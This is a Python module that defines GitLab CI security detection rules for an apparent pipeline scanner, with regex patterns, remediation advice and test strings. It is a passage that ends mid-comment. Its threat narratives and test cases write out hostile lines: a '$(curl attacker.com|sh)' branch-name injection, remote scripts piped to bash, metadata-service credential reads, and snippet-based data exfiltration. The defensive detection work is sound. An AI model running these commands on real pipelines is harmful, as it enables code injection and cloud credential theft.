"""GitLab CI extended rules — Flow Control, PPE, Credential Hygiene, System Config, Artifact Integrity.

Covers OWASP CICD-SEC-1, SEC-2, SEC-4, SEC-5, SEC-6 (extended), SEC-7, SEC-9.
These were entirely missing or undercovered in the initial implementation.
"""

import re

from taintly.models import (
    ContextPattern,
    PathPattern,
    Platform,
    RegexPattern,
    Rule,
    SequencePattern,
    Severity,
)

# Identity-gate shape shared by SEC4-GL-007: ``$GITLAB_USER_*`` compared against
# a literal / slash-regex / bareword — the spoofable access-control match.
_GITLAB_USER_GATE_RE = re.compile(
    r"\$\{?GITLAB_USER_(?:LOGIN|NAME|ID|EMAIL)\}?"
    r"\s*(?:==|!=|=~|!~)\s*"
    r"(?:['\"][^'\"]+['\"]|/[^/\n]+/|[@\w.+-]+)"
)
_WHEN_NEVER_RE = re.compile(r"^\s*when\s*:\s*never\b")
_RULES_ITEM_RE = re.compile(r"^(\s*)-\s")


class GitlabIdentityGatePattern:
    """SEC4-GL-007: a pipeline ``rules:if:`` access-control gate keyed on the
    spoofable ``$GITLAB_USER_*`` trigger identity.

    Fires on GRANT rules (``when: on_success`` / default) but NOT on
    ``when: never`` DENY rules.  A deny gate keyed on the identity withholds
    execution — it grants nothing to a spoofed actor — so flagging it as a
    confused-deputy access grant is a logic-direction false positive.  Replaces
    a bare :class:`RegexPattern`, which was blind to the rule's ``when:``
    direction.
    """

    def check(self, _content: str, lines: list[str]) -> list[tuple[int, str]]:
        results: list[tuple[int, str]] = []
        for i, line in enumerate(lines):
            if line.lstrip(" \t").startswith("#"):
                continue
            if not _GITLAB_USER_GATE_RE.search(line):
                continue
            if self._rule_is_deny_gate(lines, i):
                continue
            results.append((i + 1, line.strip()))
        return results

    @staticmethod
    def _rule_is_deny_gate(lines: list[str], idx: int) -> bool:
        """True when the matched ``if:`` at ``idx`` belongs to a ``rules:``
        list item whose ``when:`` is ``never`` (a defensive deny gate)."""
        marker = _RULES_ITEM_RE.match(lines[idx])
        if marker:
            marker_indent = len(marker.group(1))
            start = idx
        else:
            # Block-scalar / continuation ``if:`` — walk back to the list-item
            # marker that owns this condition line.
            marker_indent = None
            start = idx
            for j in range(idx - 1, -1, -1):
                s = lines[j].lstrip(" \t")
                if not s or s.startswith("#"):
                    continue
                back = _RULES_ITEM_RE.match(lines[j])
                if back:
                    marker_indent = len(back.group(1))
                    start = j
                    break
                if len(lines[j]) - len(s) == 0:
                    break  # reached a top-level key without finding a marker
            if marker_indent is None:
                return False
        # Scan the item body (lines indented deeper than the marker) up to the
        # next sibling item / dedent, looking for ``when: never``.
        for j in range(start + 1, len(lines)):
            s = lines[j].lstrip(" \t")
            if not s or s.startswith("#"):
                continue
            if len(lines[j]) - len(s) <= marker_indent:
                break  # next sibling rule item or dedent out of rules:
            if _WHEN_NEVER_RE.match(lines[j]):
                return True
        return False


class DotenvReportPattern:
    def check(self, _content: str, lines: list[str]) -> list[tuple[int, str]]:
        results: list[tuple[int, str]] = []
        for i, line in enumerate(lines):
            stripped = line.lstrip(" \t")
            if not stripped or stripped.startswith("#") or not stripped.startswith("dotenv:"):
                continue
            indent = len(line) - len(stripped)
            reports_idx = self._find_parent_key(lines, i, indent, "reports:")
            if reports_idx is None:
                continue
            reports_line = lines[reports_idx]
            reports_indent = len(reports_line) - len(reports_line.lstrip(" \t"))
            if self._find_parent_key(lines, reports_idx, reports_indent, "artifacts:") is None:
                continue
            results.append((i + 1, line.strip()))
        return results

    @staticmethod
    def _find_parent_key(
        lines: list[str], before_index: int, child_indent: int, key: str
    ) -> int | None:
        for j in range(before_index - 1, -1, -1):
            candidate = lines[j]
            stripped = candidate.strip()
            if not stripped or stripped.startswith("#"):
                continue
            indent = len(candidate) - len(candidate.lstrip(" \t"))
            if indent >= child_indent:
                continue
            return j if stripped == key else None
        return None


RULES: list[Rule] = [
    # =========================================================================
    # CICD-SEC-1: Insufficient Flow Control Mechanisms
    # =========================================================================
    Rule(
        id="SEC1-GL-001",
        title="Production environment deployment without manual approval gate",
        severity=Severity.MEDIUM,
        platform=Platform.GITLAB,
        owasp_cicd="CICD-SEC-1",
        description=(
            "A job targets a production/staging environment but does not require manual "
            "approval via 'when: manual'. Without a manual gate, any pipeline trigger "
            "(including a compromised branch push) causes immediate deployment to production. "
            "Human oversight is a critical last-resort control for privileged deployments."
        ),
        pattern=SequencePattern(
            pattern_a=r"environment:\s*(production|prod|staging|live|release)\s*$",
            absent_within=r"when:\s*manual",
            lookahead_lines=10,
            exclude=[r"^\s*#"],
        ),
        remediation=(
            "Add a manual approval gate to production deployment jobs. Prefer the modern "
            "`rules:` syntax over the deprecated `only:` keyword:\n"
            "\n"
            "deploy_production:\n"
            "  environment: production\n"
            "  when: manual\n"
            "  rules:\n"
            "    - if: '$CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH'"
        ),
        reference="https://docs.gitlab.com/ci/environments/",
        test_positive=[
            "deploy_prod:\n  stage: deploy\n  environment: production\n  script:\n    - ./deploy.sh",
            "release:\n  environment: staging\n  script:\n    - ./release.sh\n  only:\n    - main",
        ],
        test_negative=[
            "deploy_prod:\n  environment: production\n  when: manual\n  script:\n    - ./deploy.sh",
            "build:\n  script:\n    - make build",
        ],
        stride=["E", "T"],
        threat_narrative=(
            "Any pipeline trigger — including a compromised branch push or a scheduled job "
            "taken over by an attacker — can deploy directly to production with no human "
            "review. Manual approval gates are the last barrier between automated CI/CD and "
            "production scope."
        ),
    ),
    # =========================================================================
    # CICD-SEC-4: Poisoned Pipeline Execution
    # =========================================================================
    Rule(
        id="SEC4-GL-001",
        title="User-controlled GitLab CI variable used unquoted in shell script",
        severity=Severity.HIGH,
        platform=Platform.GITLAB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "User-controlled GitLab predefined variables (CI_COMMIT_MESSAGE, "
            "CI_COMMIT_TITLE, CI_COMMIT_AUTHOR, CI_MERGE_REQUEST_TITLE, "
            "CI_MERGE_REQUEST_DESCRIPTION, CI_COMMIT_BRANCH, "
            "CI_MERGE_REQUEST_SOURCE_BRANCH_NAME) are used unquoted in shell scripts. "
            "These values are attacker-controlled — branch names, commit titles, commit "
            "author identities, and message bodies can contain shell metacharacters, "
            "enabling command injection when unquoted. Variables wrapped in double quotes "
            "are excluded (though sanitization is still recommended for values passed to "
            "subcommands)."
        ),
        pattern=RegexPattern(
            match=r"\$\{?(CI_COMMIT_MESSAGE|CI_COMMIT_TITLE|CI_COMMIT_AUTHOR|CI_MERGE_REQUEST_TITLE|CI_MERGE_REQUEST_DESCRIPTION|CI_COMMIT_BRANCH|CI_MERGE_REQUEST_SOURCE_BRANCH_NAME)\}?",
            exclude=[
                r"^\s*#",
                r"^\s*[\w_]+:\s*\$\{?CI_",  # YAML key-value assignment starting with $CI_
                r"^\s*[\w_]+:\s*'[^']*\$",  # YAML key-value where value is a single-quoted string (variable inside string literal, not in shell)
                r"^\s*[\w_]+:\s*\"[^\"]*\$",  # YAML key-value where value is a double-quoted string
                r"^\s*-?\s*if:",  # rules:if blocks — evaluated by GitLab engine, not shell
                # Variable wrapped DIRECTLY in double quotes: `"$VAR"` /
                # `"${VAR}"` — bash word-splitting / glob suppressed.
                r'"\$\{?(CI_COMMIT_MESSAGE|CI_COMMIT_TITLE|CI_COMMIT_AUTHOR|CI_MERGE_REQUEST_TITLE|CI_MERGE_REQUEST_DESCRIPTION|CI_COMMIT_BRANCH|CI_MERGE_REQUEST_SOURCE_BRANCH_NAME)\}?"',
                # Variable inside a WRAPPING double-quoted string that
                # spans other text — e.g. ``--form description="${A} /
                # ${B} / ${CI_COMMIT_SHA}"``.  The bash word-splitting
                # protection is identical to the direct-wrap form above;
                # the wrap just spans more bytes.  Surfaced by 2026-05-18
                # audit on GNOME/glib (curl --form description chain
                # idiom is ubiquitous in release/scan/notification jobs).
                # Match: an opening ``"``, any non-``"`` payload that
                # contains the variable, and a closing ``"`` — all on
                # the same line.  Per-line evaluation is intentional;
                # we accept the tradeoff that a line with BOTH a quoted
                # form AND a separate unquoted form would also suppress
                # the unquoted one, which is rare in practice and the
                # operator can split into separate lines if needed.
                r'"[^"\n]*\$\{?(CI_COMMIT_MESSAGE|CI_COMMIT_TITLE|CI_COMMIT_AUTHOR|CI_MERGE_REQUEST_TITLE|CI_MERGE_REQUEST_DESCRIPTION|CI_COMMIT_BRANCH|CI_MERGE_REQUEST_SOURCE_BRANCH_NAME)\}?[^"\n]*"',
                # Variable inside SINGLE quotes: `$VAR` is literal text
                # in bash, no expansion happens — no injection surface.
                r"'\$\{?(CI_COMMIT_MESSAGE|CI_COMMIT_TITLE|CI_COMMIT_AUTHOR|CI_MERGE_REQUEST_TITLE|CI_MERGE_REQUEST_DESCRIPTION|CI_COMMIT_BRANCH|CI_MERGE_REQUEST_SOURCE_BRANCH_NAME)\}?'",
                # Bash ``[[ ]]`` conditional — per Bash manual §3.2.5.2,
                # word splitting and pathname expansion are NOT performed
                # on words between ``[[`` and ``]]``.  An unquoted variable
                # reference there cannot inject.  Mirrors the
                # equivalent exclude on SEC4-GL-003 (already present for
                # the CI_COMMIT_REF_NAME family).  Surfaced on
                # gitlab-org/cli `.gitlab-ci.yml:147` and gitlab-org/
                # gitlab-runner `.gitlab/ci/qa.gitlab-ci.yml:227` during
                # the 2026-05-19 negative-corpus harvest.
                r"\[\[[^\n]*\$\{?(CI_COMMIT_MESSAGE|CI_COMMIT_TITLE|CI_COMMIT_AUTHOR|CI_MERGE_REQUEST_TITLE|CI_MERGE_REQUEST_DESCRIPTION|CI_COMMIT_BRANCH|CI_MERGE_REQUEST_SOURCE_BRANCH_NAME)\}?[^\n]*\]\]",
                # Bash variable assignment — per Bash manual §3.5.6,
                # word splitting and pathname expansion are NOT
                # performed on the RHS of a variable assignment.
                # ``VAR=$X`` is equivalent to ``VAR="$X"`` (the entire
                # expanded value binds as a single string).  Anchor on
                # ``IDENT=$CI_...`` at the start of a shell-line
                # position — not inside quotes, not inside a command
                # argument.  The ``(?<![./\w])`` lookbehind prevents
                # matching path fragments like ``../VAR=$X``.
                r"(?<![./\w])\b[A-Z_][A-Z0-9_]*=\$\{?(CI_COMMIT_MESSAGE|CI_COMMIT_TITLE|CI_COMMIT_AUTHOR|CI_MERGE_REQUEST_TITLE|CI_MERGE_REQUEST_DESCRIPTION|CI_COMMIT_BRANCH|CI_MERGE_REQUEST_SOURCE_BRANCH_NAME)\}?\b",
            ],
            # Quoted-marker heredoc bodies (<<'EOF' / <<"EOF" / <<\EOF)
            # suppress $VAR expansion per Bash §3.6.6; skip those lines.
            heredoc_aware=True,
            # GitLab ``rules.*.if:`` is a tiny expression DSL evaluated
            # by the GitLab CI engine, NOT a shell.  Multi-line ``if: |``
            # block scalars (common in gitlabhq/.gitlab/ci/rules.gitlab-ci.yml)
            # have continuation lines like ``$CI_COMMIT_REF_NAME == ...``
            # that the same-line ``^\s*-?\s*if:`` exclude misses.  Mask
            # them too.  (FP-audit class C, 2026-05-17.)
            gitlab_if_block_aware=True,
        ),
        remediation=(
            "Double-quote the variable in shell, or sanitize before use.\n"
            "`taintly --fix` will wrap unquoted occurrences for you:\n"
            '  - echo "$CI_COMMIT_MESSAGE"\n'
            "For values passed to subcommands, also sanitize via parameter expansion:\n"
            '  - SAFE_BRANCH="${CI_COMMIT_BRANCH//[^a-zA-Z0-9._-]/}"\n'
            '  - docker tag image:latest "image:$SAFE_BRANCH"'
        ),
        reference="https://docs.gitlab.com/ci/variables/predefined_variables/",
        test_positive=[
            "    - echo $CI_COMMIT_MESSAGE",
            "    - git tag $CI_MERGE_REQUEST_TITLE",
            "    - deploy.sh $CI_COMMIT_BRANCH",
            "    - echo $CI_COMMIT_TITLE",
            "    - echo $CI_COMMIT_AUTHOR",
        ],
        test_negative=[
            "    # uses $CI_COMMIT_MESSAGE for logging",
            "    # CI_COMMIT_MESSAGE is logged elsewhere",
            '    - if: $CI_COMMIT_BRANCH == "main"',
            "    - if: $CI_MERGE_REQUEST_SOURCE_BRANCH_NAME =~ /^feature/",
            '    - echo "$CI_COMMIT_MESSAGE"',
            '    - deploy.sh "$CI_COMMIT_BRANCH"',
            '    - git tag "$CI_MERGE_REQUEST_TITLE"',
            '    - echo "$CI_COMMIT_TITLE"',
            '    - echo "$CI_COMMIT_AUTHOR"',
        ],
        stride=["T", "E"],
        threat_narrative=(
            "Branch names and commit messages are attacker-controlled: a contributor can "
            "set a branch name containing shell metacharacters — such as `$(curl "
            "attacker.com|sh)` — that execute when CI_COMMIT_BRANCH is interpolated "
            "unquoted in a script. The injected commands run with the full permissions of "
            "the GitLab runner token."
        ),
    ),
    Rule(
        id="SEC4-GL-002",
        title="Trigger job passes CI_JOB_TOKEN or sensitive variables to downstream pipeline",
        severity=Severity.MEDIUM,
        platform=Platform.GITLAB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "A trigger: job passes CI_JOB_TOKEN, CI_REGISTRY_PASSWORD, or CI_DEPLOY_PASSWORD "
            "as variables to a downstream pipeline. Downstream projects may have weaker access "
            "controls than the triggering project. If the downstream project is compromised, "
            "the upstream token/credentials are exposed."
        ),
        pattern=ContextPattern(
            anchor=r"(CI_JOB_TOKEN|CI_REGISTRY_PASSWORD|CI_DEPLOY_PASSWORD)",
            requires=r"trigger:",
            exclude=[r"^\s*#"],
            scope="job",  # Both patterns are job-level; prevents cross-job false positives
        ),
        remediation=(
            "Use project access tokens with minimum required scopes for cross-project triggers "
            "instead of passing CI_JOB_TOKEN. Review downstream project permissions before "
            "passing any credential variables."
        ),
        reference="https://docs.gitlab.com/ci/triggers/",
        test_positive=[
            "trigger_downstream:\n  trigger:\n    project: my-group/my-project\n  variables:\n    UPSTREAM_TOKEN: $CI_JOB_TOKEN",
        ],
        test_negative=[
            "trigger_downstream:\n  trigger:\n    project: my-group/my-project\n  variables:\n    ENV: production",
            "build:\n  script:\n    - docker login -u gitlab-ci-token -p $CI_JOB_TOKEN",
        ],
        stride=["I", "E"],
        threat_narrative=(
            "CI_JOB_TOKEN forwarded to a downstream pipeline grants that pipeline the same "
            "repository access scope as the originating project, potentially bridging trust "
            "boundaries between projects. A compromised downstream pipeline can use the "
            "forwarded token to read protected variables, push to the upstream repository, "
            "or trigger further pipelines."
        ),
    ),
    # =========================================================================
    # CICD-SEC-6: Insufficient Credential Hygiene — extended
    # =========================================================================
    Rule(
        id="SEC6-GL-006",
        title="wget/bash pattern or bash-subshell-curl in script block",
        severity=Severity.HIGH,
        platform=Platform.GITLAB,
        owasp_cicd="CICD-SEC-6",
        description=(
            "Script uses wget piped to shell, bash <(curl ...) subshell, or PowerShell iex() "
            "to download and execute remote code. These patterns bypass the separate "
            "download-then-verify workflow and execute remote code with no integrity check. "
            "Extends SEC6-GL-002 to cover patterns that rule misses."
        ),
        pattern=RegexPattern(
            match=r"(wget\s[^|\n]*\|\s*(bash|sh|zsh|python|perl))|(bash\s*<\s*\(\s*curl)|(iex\s*\(.*Invoke-WebRequest)|(\|\s*python\s+-c\s+['\"])",
            exclude=[r"^\s*#"],
        ),
        remediation=(
            "Download the script separately, verify its checksum, then execute:\n"
            "  - wget -q -O install.sh https://example.com/install.sh\n"
            "  - echo '<expected_sha256>  install.sh' | sha256sum -c -\n"
            "  - bash install.sh"
        ),
        reference="https://owasp.org/www-project-top-10-ci-cd-security-risks/",
        test_positive=[
            "    - wget -q -O - https://example.com/setup.sh | bash",
            "    - wget https://example.com/install.sh | sh",
            "    - bash <(curl -s https://example.com/bootstrap.sh)",
        ],
        test_negative=[
            "    - wget -q -O setup.sh https://example.com/setup.sh",
            "    - curl -fsSL -o install.sh https://example.com/install.sh",
            "    # wget https://example.com | bash",
        ],
        stride=["T", "E"],
        threat_narrative=(
            "Piping a remote script to bash or executing a URL via shell substitution gives "
            "the remote server arbitrary code execution in your runner with no opportunity "
            "to inspect what will be executed before it runs. DNS hijacking, CDN "
            "compromise, or a supply chain attack on the hosting domain is sufficient to "
            "substitute a malicious payload."
        ),
    ),
    Rule(
        id="SEC6-GL-007",
        title="Long-lived cloud credentials in GitLab CI configuration",
        severity=Severity.MEDIUM,
        platform=Platform.GITLAB,
        owasp_cicd="CICD-SEC-6",
        description=(
            "Pipeline configuration references long-lived cloud credentials "
            "(AWS access keys, GCP service account keys, Azure client secrets). "
            "These should be replaced with OIDC-based short-lived tokens via GitLab's "
            "ID token feature, which generates ephemeral credentials scoped to the pipeline."
        ),
        pattern=RegexPattern(
            match=r"(?i)(AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|GOOGLE_APPLICATION_CREDENTIALS|GOOGLE_CREDENTIALS|AZURE_CLIENT_SECRET|AZURE_CREDENTIALS)\s*:",
            exclude=[r"^\s*#"],
        ),
        remediation=(
            "Use GitLab CI OIDC ID tokens for cloud authentication:\n"
            "job:\n  id_tokens:\n    AWS_OIDC_TOKEN:\n      aud: sts.amazonaws.com\n"
            "  script:\n    - aws sts assume-role-with-web-identity --role-arn $ROLE_ARN --web-identity-token $AWS_OIDC_TOKEN"
        ),
        reference="https://docs.gitlab.com/ci/cloud_services/",
        test_positive=[
            "    AWS_ACCESS_KEY_ID: $AWS_ACCESS_KEY_ID",
            "  variables:\n    AWS_SECRET_ACCESS_KEY: $SECRET",
            "    GOOGLE_APPLICATION_CREDENTIALS: /keys/service-account.json",
        ],
        test_negative=[
            "    AWS_REGION: us-east-1",
            "    # AWS_ACCESS_KEY_ID: old-key",
        ],
        stride=["I", "E"],
        threat_narrative=(
            "Long-lived cloud credentials that are exfiltrated from a runner environment "
            "remain valid indefinitely until manually rotated, unlike OIDC tokens which "
            "expire within minutes. An attacker who reads the credential from a log, a job "
            "trace, or a compromised runner gains persistent cloud access independent of "
            "the CI/CD system."
        ),
    ),
    # =========================================================================
    # SEC6-GL-009: Exfil-shaped primitive in GitLab CI script: block.
    # GitLab port of SEC6-GH-008 (Wiz prt-scan class, April 2026).
    #
    # GitLab API primitives that exist for legitimate operations but
    # also serve as zero-infrastructure exfiltration channels — traffic
    # goes to gitlab.com (or the self-managed instance), not to an
    # attacker-owned host, so DNS/IP blocklists never see it.
    #
    # The four primitives:
    #   (a) Snippet drop:   `glab snippet create` / `glab api -X POST
    #       /snippets` / API call to `/projects/:id/snippets`.  Snippets
    #       can be public / internal / private; a public snippet is the
    #       GitLab analog of a public gist.  Attacker reads it from
    #       their own account.
    #   (b) Issue / note drop:  `glab issue create` / `glab mr note
    #       create` / `glab api -X POST .../issues` / `.../notes` /
    #       `.../discussions`.  Issue body / comment body becomes the
    #       data channel.
    #   (c) IMDS:  `curl 169.254.169.254` / `wget 169.254.169.254`.
    #       GitLab runners that run on cloud compute (especially
    #       self-hosted AWS / GCP / Azure) expose instance-role tokens
    #       via IMDS.  IPv6 form `[fd00:ec2::254]` for AWS.
    #   (d) Runner registration: `curl $CI_API_V4_URL/runners` with
    #       a registration-token body, or `glab api -X POST /runners`.
    #       Lets an attacker register their own machine as a runner for
    #       the victim group/project.
    # =========================================================================
    Rule(
        id="SEC6-GL-009",
        title=(
            "Exfil-shaped primitive in GitLab script: block "
            "(snippet / issue-note / IMDS / runner-register)"
        ),
        severity=Severity.MEDIUM,
        platform=Platform.GITLAB,
        owasp_cicd="CICD-SEC-6",
        description=(
            "A GitLab CI ``script:`` block invokes a primitive that "
            "matches the exfiltration signature used by the Wiz-"
            "disclosed prt-scan campaign (April 2026) and the "
            "Stawinski PyTorch / Praetorian self-hosted-runner "
            "compromises.  The primitives are:\n"
            "  - ``glab snippet create`` / ``glab api -X POST /snippets`` "
            "— public-snippet drop channel.\n"
            "  - ``glab issue create`` / ``glab mr note create`` / "
            "``glab api -X POST`` targeting ``/issues`` / ``/notes`` "
            "/ ``/discussions`` — issue-body / comment-body drop.\n"
            "  - ``curl 169.254.169.254`` / ``wget 169.254.169.254`` "
            "(and IPv6 ``[fd00:ec2::254]``) — IMDS on cloud-compute "
            "runners yields temporary cloud credentials.\n"
            "  - ``curl $CI_API_V4_URL/runners`` / "
            "``glab api -X POST /runners`` with a registration "
            "token — self-hosted-runner enrollment lets an attacker "
            "register their own machine as a runner.\n"
            "Each primitive has legitimate uses (publishing a release "
            "snippet, intentional IMDS queries on a narrow-role "
            "instance, dynamic runner orchestration in a GitLab ops "
            "pipeline).  The rule surfaces presence so a reviewer can "
            "verify intent.  Signal is especially high when the "
            "workflow also triggers on MR events or reads MR-author-"
            "controlled context."
        ),
        pattern=RegexPattern(
            match=(
                r"(?:"
                # Snippet drop channel
                r"\bglab\s+snippet\s+create\b"
                r"|\bglab\s+api\s+(?:-X\s+POST\s+|--method\s+POST\s+)[^\n#]*"
                r"/snippets\b"
                # Issue / MR note / discussion drop — require POST verb so
                # plain reads (`glab api /projects/x/issues` GET) don't fire.
                r"|\bglab\s+(?:issue|mr)\s+(?:create|note)\b"
                r"|\bglab\s+api\s+(?:-X\s+POST\s+|--method\s+POST\s+)[^\n#]*"
                r"/projects/[^\s/]+/(?:issues|merge_requests|notes|discussions)"
                # IMDS — IPv4 + IPv6 link-local forms
                r"|\b(?:curl|wget|http)\s+[^#\n]*169\.254\.169\.254"
                r"|\b(?:curl|wget|http)\s+[^#\n]*\[fd00:ec2::254\]"
                # Runner registration via curl to CI_API_V4_URL /runners
                r"|\b(?:curl|wget)\s+[^#\n]*\$(?:CI_API_V4_URL|GITLAB_URL|CI_SERVER_URL)[^#\n]*/runners\b"
                # Runner registration via glab api
                r"|\bglab\s+api\s+(?:-X\s+POST\s+|--method\s+POST\s+)[^\n#]*/runners\b"
                r")"
            ),
            exclude=[
                r"^\s*#",
                # `glab release upload` / `glab ci lint` / `glab mr view`
                # are reads or non-exfil writes — not matched by the
                # anchor, no exclude needed, documenting for clarity.
            ],
        ),
        remediation=(
            "Each primitive has a legitimate use, so the remediation\n"
            "is specific to why it's there:\n"
            "  - `glab snippet create` — if you're dropping a report,\n"
            "    attach it to a release via `glab release upload`\n"
            "    instead; snippets default to the project visibility,\n"
            "    so a public-project snippet is readable by anyone.\n"
            "  - `glab api POST .../issues` / `.../notes` — only\n"
            "    legitimate on trusted triggers (push to protected\n"
            "    branch, `schedule`, `workflow_dispatch` equivalent\n"
            "    via `workflow:` rules).  Never on MR pipelines where\n"
            "    the body content can include attacker-steered text.\n"
            "  - `curl 169.254.169.254` (IMDS) — on GitLab shared\n"
            "    runners IMDS isn't present; on self-hosted cloud\n"
            "    runners, narrow the instance role (single ARN, not\n"
            "    `*:*`), require IMDSv2, set hop-limit 1.  Prefer\n"
            "    OIDC-federated credentials via `id_tokens:` (see\n"
            "    SEC6-GL-007 guide).\n"
            "  - Runner registration-token POST — this is an ops\n"
            "    action.  Only run it in a maintainer-triggered\n"
            "    pipeline with a protected environment.  Presence on\n"
            "    an MR-triggered pipeline means an MR author can\n"
            "    register their own machine as a runner.\n"
            "Run `taintly --guide SEC6-GH-008` for the full\n"
            "checklist — the GitHub guide applies directly with\n"
            "`glab` / `$CI_API_V4_URL` substitutions."
        ),
        reference=(
            "https://www.wiz.io/blog/six-accounts-one-actor-inside-the-prt-scan-supply-chain-campaign; "
            "https://safedep.io/prt-scan-github-actions-exfiltration-campaign/; "
            "https://docs.gitlab.com/ee/user/snippets.html; "
            "https://docs.gitlab.com/ee/api/runners.html"
        ),
        test_positive=[
            # glab snippet drop
            ("run:\n  script:\n    - glab snippet create --title exfil --content @loot.json"),
            # glab issue create
            ('run:\n  script:\n    - glab issue create --title x --description "$LOOT"'),
            # glab api POST issues
            (
                "run:\n  script:\n"
                "    - glab api -X POST /projects/1/issues -F title=x -F description=y"
            ),
            # IMDS curl
            ("run:\n  script:\n    - curl -s http://169.254.169.254/latest/meta-data/"),
            # Runner registration via curl
            ("run:\n  script:\n    - curl -X POST --form token=$TOK $CI_API_V4_URL/runners"),
            # glab api POST /runners
            ("run:\n  script:\n    - glab api -X POST /runners -F token=$TOK"),
        ],
        test_negative=[
            # glab release upload — legitimate, different primitive
            ("release:\n  script:\n    - glab release upload v1.0 artifact.zip"),
            # glab api GET (read) — no POST/PUT/PATCH
            ("read:\n  script:\n    - glab api /projects/1/issues/42"),
            # IMDS IP in a comment, not a curl
            ("doc:\n  script:\n    - echo 'IMDS is at 169.254.169.254'"),
            # curl to an unrelated URL
            ("health:\n  script:\n    - curl https://api.example.com/health"),
            # glab api to an unrelated endpoint
            ("me:\n  script:\n    - glab api /user"),
            # Commented out
            ("job:\n  script:\n    # - curl http://169.254.169.254\n    - echo hi"),
        ],
        stride=["I", "E", "R"],
        threat_narrative=(
            "Zero-infrastructure exfiltration.  The attacker never "
            "owns a DNS name or an IP address — traffic goes to "
            "gitlab.com (or the victim's self-managed instance) or "
            "to IMDS, both of which are on every defensive "
            "allowlist.  The attacker publishes a sockpuppet GitLab "
            "account, opens a fork MR whose pipeline runs "
            "``glab snippet create`` with the loot, then reads the "
            "snippet from their own account.  The Stawinski / "
            "Praetorian self-hosted-runner post-mortems document "
            "the IMDS + runner-registration pivot for CI "
            "compromise."
        ),
        confidence="low",
        incidents=[
            "prt-scan (Wiz, Apr 2026) — GH analog",
            "PyTorch supply chain (Stawinski, Jan 2024) — GH analog",
            "TensorFlow self-hosted runner (Praetorian, 2024) — GH analog",
        ],
    ),
    # =========================================================================
    # CICD-SEC-7: Insecure System Configuration
    # =========================================================================
    Rule(
        id="SEC7-GL-001",
        title="GitLab CI debug trace enabled — secrets printed to job logs",
        severity=Severity.MEDIUM,
        platform=Platform.GITLAB,
        owasp_cicd="CICD-SEC-7",
        description=(
            "CI_DEBUG_TRACE or CI_DEBUG_SERVICES is set to true in the pipeline configuration. "
            "Debug trace prints every command, environment variable, and script expansion "
            "to job logs — this includes all CI/CD variables marked as masked or protected. "
            "Logs may be accessible to unauthorized users in public or internal projects."
        ),
        pattern=RegexPattern(
            match=r"(CI_DEBUG_TRACE|CI_DEBUG_SERVICES)\s*:\s*['\"]?([Tt]rue|1)['\"]?",
            exclude=[r"^\s*#"],
        ),
        remediation=(
            "Remove CI_DEBUG_TRACE from the pipeline config. Debug trace exposes the "
            "cleartext value of every variable visible to the job — including variables "
            "marked both Masked and Protected — in the job log. Marking CI_DEBUG_TRACE "
            "itself as 'Protected' does not reduce the data it leaks; it only limits "
            "where debug mode activates.\n"
            "\n"
            "If debugging a pipeline is genuinely required, rotate any secrets visible "
            "to the job after the debug run and restrict who can view the job log."
        ),
        reference="https://docs.gitlab.com/ci/variables/#enable-debug-logging",
        test_positive=[
            "  CI_DEBUG_TRACE: true",
            "  CI_DEBUG_TRACE: 'true'",
            "  CI_DEBUG_SERVICES: true",
        ],
        test_negative=[
            "  CI_JOB_TOKEN: $CI_JOB_TOKEN",
            "  # CI_DEBUG_TRACE: true",
            "  CI_DEBUG_TRACE: false",
        ],
        stride=["I"],
        threat_narrative=(
            "GitLab CI_DEBUG_TRACE enables verbose step-by-step logging that includes the "
            "values of masked CI/CD variables in plain text, bypassing the masking "
            "protection. Attackers with access to job logs can read all secrets while the "
            "debug trace is active, including tokens, API keys, and deployment credentials."
        ),
    ),
    # =========================================================================
    # CICD-SEC-9: Improper Artifact Integrity Validation
    # =========================================================================
    Rule(
        id="SEC9-GL-001",
        title="Artifacts block without access restriction in potentially public project",
        severity=Severity.MEDIUM,
        platform=Platform.GITLAB,
        owasp_cicd="CICD-SEC-9",
        # 2026-04-27 audit: route to review-needed. The threat
        # narrative ("anonymous users can download these") only
        # applies to public projects with sensitive artifact content,
        # neither of which is visible from the CI YAML alone. Field
        # test (gitlabhq, 2026-04) showed this rule firing on every
        # job that produces an artifact, dominating the finding
        # volume on internal projects where the threat doesn't apply.
        review_needed=True,
        confidence="low",
        description=(
            "Job produces artifacts without specifying an `artifacts:access:` value. In "
            "public GitLab projects, artifacts are downloadable by anonymous users by "
            "default. Artifacts may contain build outputs, environment details, dependency "
            "lists, or log content that reveals internal infrastructure. Valid values for "
            "`artifacts:access:` are `all` (default), `developer`, and `none` (GitLab 17.x "
            "also added `maintainer`)."
        ),
        pattern=SequencePattern(
            pattern_a=r"^\s*artifacts:\s*$",
            # GitLab CI accepts the access value with optional single or
            # double quotes (e.g. ``access: "developer"``); the regex
            # must allow both quoted and unquoted forms.  Pre-2026-05
            # version did not, producing FPs on every quoted access
            # declaration (round-2 corpus review, sec9-gl-001.md #29).
            absent_within=r"""access:\s*['"]?(developer|none|maintainer)['"]?\b""",
            lookahead_lines=12,
            exclude=[r"^\s*#"],
        ),
        remediation=(
            "Set an explicit access level on artifact blocks. Valid values are "
            "`all` (default), `developer`, `none`, and `maintainer` (GitLab 17.x+):\n"
            "\n"
            "artifacts:\n"
            "  access: developer   # was: implicit `all`\n"
            "  paths:\n"
            "    - dist/"
        ),
        reference="https://docs.gitlab.com/ci/yaml/#artifactsaccess",
        test_positive=[
            "build:\n  script:\n    - make build\n  artifacts:\n    paths:\n      - dist/",
            "test:\n  script:\n    - pytest\n  artifacts:\n    reports:\n      junit: report.xml",
        ],
        test_negative=[
            "build:\n  script:\n    - make build\n  artifacts:\n    access: developer\n    paths:\n      - dist/",
            "test:\n  script:\n    - pytest\n  artifacts:\n    access: none\n    reports:\n      junit: report.xml",
            # GitLab CI accepts optional quotes around the value;
            # rule must not FP on either form.
            'test:\n  script:\n    - pytest\n  artifacts:\n    access: "developer"\n    reports:\n      junit: report.xml',
            "publish:\n  script:\n    - make release\n  artifacts:\n    access: 'maintainer'\n    paths:\n      - dist/",
        ],
        stride=["I"],
        threat_narrative=(
            "Artifacts without access restriction in a public project are downloadable by "
            "anyone who knows the job URL, including unauthenticated users. Build outputs "
            "may contain compiled binaries, environment dumps, test coverage reports, or "
            "dependency lockfiles that reveal internal library versions useful for targeted "
            "attacks."
        ),
    ),
    # =========================================================================
    # SEC9-GL-004 — artifacts:untracked: true.
    # ``untracked: true`` sweeps every file Git is not tracking — including
